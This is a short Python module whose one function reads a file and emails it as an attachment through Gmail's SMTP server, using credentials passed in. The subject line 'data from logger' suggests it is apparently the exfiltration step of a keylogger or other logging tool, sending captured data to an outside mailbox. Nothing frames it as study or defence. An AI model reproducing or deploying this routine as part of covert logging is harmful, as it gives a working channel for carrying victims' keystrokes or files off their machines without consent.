import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import time
from email import encoders
 
def sendData(fileName, addr, password):
	fromaddr = addr
	toaddr = addr
	passw = password
	msg = MIMEMultipart()
	msg['From'] = fromaddr
	msg['To'] = toaddr
	msg['Subject'] = "data from logger"
	 
	body = "Here is the data :)"
	msg.attach(MIMEText(body, 'plain'))
	 
	#filename = "test.txt"
	attachment = open(fileName, "rb")
	 
	part = MIMEBase('application', 'octet-stream')
	part.set_payload((attachment).read())
	encoders.encode_base64(part)
	part.add_header('Content-Disposition', "attachment; filename= %s" % fileName)
	 
	msg.attach(part)
	 
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.starttls()
	server.login(fromaddr, passw)
	text = msg.as_string()
	server.sendmail(fromaddr, toaddr, text)
	server.quit()